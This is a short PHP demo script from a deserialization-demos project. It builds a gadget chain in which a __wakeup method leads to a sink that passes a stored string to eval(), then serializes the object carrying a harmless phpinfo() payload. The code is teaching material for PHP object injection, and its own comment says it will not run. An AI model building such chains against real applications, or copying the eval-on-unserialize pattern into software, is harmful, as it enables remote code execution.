#!/usr/bin/env php
<?php
/* Creates gadget chain exploit to STDOUT or file.
   Note that this example will not run.

   SPDX-License-Identifier: GPL-3.0-or-later

   This file is part of the deserialization demos:
   https://github.com/PeterMosmans/deserialization-demos
 */

class Initial
{
  private $secondary;
  function __wakeup()
  {
    if (isset($this->secondary)) {
      return $this->secondary->sink();
    }
  }
}
class Secondary
{
  private $payload = "";
  function sink()
  {
    eval($this->payload);
  }
}

$object = new Initial();
$secondary = new Secondary();
$secondary->payload = "phpinfo();";
$object->secondary = $secondary;
$serialized = serialize($object);

include "serialize_function.php";


?>
